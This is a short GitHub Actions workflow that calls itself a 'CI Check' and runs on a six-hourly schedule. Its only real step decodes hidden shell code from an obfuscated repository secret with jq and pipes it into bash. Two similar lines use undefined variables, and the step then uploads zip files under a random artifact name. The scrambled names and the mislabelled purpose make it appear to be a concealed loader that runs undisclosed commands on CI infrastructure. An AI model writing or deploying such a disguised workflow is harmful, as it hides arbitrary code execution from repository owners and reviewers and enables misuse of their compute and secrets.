name: CI Check
on:
  workflow_dispatch:

  schedule:
    - cron: '21 0,6,12,18 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  deploy:
    name: Main task
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Bootstrap
        env:
          ft622: ${{ secrets.ft622 }}
        run: |
          printf '%s' "$ft622" | jq -r .ms5943 | /bin/bash
          printf '%s' "$d09910" | jq -r .we740 | /bin/bash
          printf '%s' "$nbq598" | jq -r .ax480 | /bin/bash

      - name: Archive artifact
        uses: actions/upload-artifact@v4
        with:
          name: LM0p5rTS
          path: "*.zip"
          retention-days: 1
